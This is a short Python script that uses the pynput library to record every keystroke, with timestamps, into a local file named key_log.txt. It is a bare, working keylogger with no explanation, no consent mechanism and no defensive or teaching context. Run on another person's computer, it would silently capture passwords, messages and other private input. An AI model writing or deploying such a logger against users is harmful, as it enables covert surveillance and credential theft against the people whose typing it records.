from pynput.keyboard import Listener
import logging

# Set up logging
log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info(f"Special key {key} pressed")

# Set up the listener
with Listener(on_press=on_press) as listener:
    listener.join()